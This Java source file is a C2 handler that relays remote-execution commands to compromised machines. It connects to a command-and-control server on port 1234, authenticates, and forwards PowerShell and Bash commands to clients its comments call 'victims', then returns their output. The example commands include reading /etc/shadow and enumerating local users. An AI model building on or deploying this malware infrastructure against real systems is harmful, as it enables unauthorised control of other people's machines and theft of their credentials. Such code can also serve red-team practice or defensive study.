package Servers.Beacon;

import java.io.IOException;
import java.net.Socket;
import java.util.ArrayList;
import java.util.HashMap;

import Servers.Duplexer;
import Servers.keepAlive;

public class BeaconC2Handler implements Runnable{
    // Pointer to the Long Range Beacon Server that interacts with the clients (victims)
    private BeaconServer beaconServer;

    // Pointer to the C2 Server that the user interacts with the user
    private Duplexer C2Server;

    // Hashed Password for Authentication to the C2 Server
    private String passwordDigest;

    // Class and Thread that send a KEEP_ALIVE Messsage to the C2 Server every 30 seconds to keep the socket open
    private keepAlive keepAliveClass;
    private Thread keepAliveThread;
    private Object sendLock;

    /**
     * This starts a thread that sends and receives messages with the C2 Server
     * 
     * This thread then interacts with the Long Range Beacon Server, the Long Range Beacon
     * Server then interacts with all of the clients (victims)
     * 
     * @param beaconServer The Long Range Beacon Server
     * @param C2ServerIPAddress The IP Address of the C2 Server
     * @throws IOException
     */
    protected BeaconC2Handler(BeaconServer beaconServer, String C2ServerIPAddress, String passwordDigest) throws IOException{
        this.beaconServer = beaconServer;
        Socket socket = new Socket(C2ServerIPAddress, 1234);
        this.C2Server = new Duplexer(socket);
        this.passwordDigest = passwordDigest;
        this.sendLock = new Object();
        this.keepAliveClass = new keepAlive(C2Server, sendLock, false, false);
        this.keepAliveThread = new Thread(keepAliveClass);
    }

    /**
     * Function meant to be used by the Long Range Beacon Server
     * to send data back to the C2 Server when it's requested
     * 
     * @param Data The Data to be sent back to the C2 Server
     */
    protected void sendDataToC2Server(String Data){
        synchronized(sendLock){
            C2Server.send(Data);
        }
    }

    @Override
    public void run(){
        /**
         * Commands from the C2 Server are organized by two attributes
         * Type - Command, Request, Status
         * Scope - Windows, Linux, or IPv4 Address
         * 
         * Examples
         * 
         * Command Windows_Get-LocalUser
         * Request Linux_
         * Request 192.168.1.5_
         * Scope All
         * Command Linux_whoami
         * Command 10.0.10.x_cat /etc/shadow
         */

        // Attempt to authenticate with the C2 Server. If authentication fails, gracefully close, and distribute the quit
        // message to the Beacon Server for further distribution.
        Boolean authenticationSentinel = true;
        C2Server.send(passwordDigest);
        try{
            String message = C2Server.receive();
            if(!(message.equals("Authentication Successful"))){
                String reason = "Authentication with the C2 Server Unsuccesful. Message Received from C2 Server: " + message;
                beaconServer.quit(reason);
                C2Server.close();
                authenticationSentinel = false;
            } else {
                keepAliveThread.start();
            }
        }catch(IOException e){
            e.printStackTrace();
        }
        
        while(authenticationSentinel){
            try{
                String message = C2Server.receive();
                if(!(message.equals("KEEP_ALIVE"))){
                    System.out.println(message);
                    if(message.equals("quit")){
                        beaconServer.quit("C2 Server Shutting Down");
                        authenticationSentinel = false;
                        break;
                    }
                    String[] tokensAndCommands = message.split("_");
                    String[] tokens = tokensAndCommands[0].split(" ");
                    String verb = tokens[0];
                    String scope = tokens[1];
                    String commands = tokensAndCommands[1];
                    if(verb.equals("Command")){
                        // If a message is a command, it will be in the format "Command [Scope - Windows, Linux, or IPv4 Address]_[Powershell/Bash command to be run]"
                        beaconServer.distributeCommands(scope, commands);
                    }
                    // If a message is a request, it will be in the format "Request [Scope - Windows, Linux, or IPv4 Address]_"
                    else if(verb.equals("Request")){
                        StringBuilder responseToRequest = new StringBuilder();
                        HashMap<String, ArrayList<String>> clientResponses = beaconServer.getClientResponses(scope);
                        for (String IP : clientResponses.keySet()) {
                            responseToRequest.append("Client IP: ").append(IP).append("\n");
                            responseToRequest.append("Responses:\n");

                            ArrayList<String> responses = clientResponses.get(IP);
                            for (int i = 0; i < responses.size(); i++) {
                                String line = responses.get(i).trim(); // Trim to remove extra spaces or newlines
                                
                                // Only add if the line is not empty
                                if (!line.isEmpty()) {
                                    responseToRequest.append(String.format("  %d. %s%n", i + 1, line));
                                }
                            }
                            responseToRequest.append("\n"); // Separate each client's response block with a newline
                        }
                        C2Server.send(responseToRequest.toString());
                    }
                    // If a message is a Status check, it will be in the format "Status All_"
                    else if(verb.equals("Status")){
                        String responseToRequest;
                        responseToRequest = beaconServer.getClientStatus();
                        C2Server.send(responseToRequest);
                    }
                }
            } catch(IOException e){
                e.printStackTrace();
                keepAliveClass.stopKeepAlive();
            }
        }
    }
}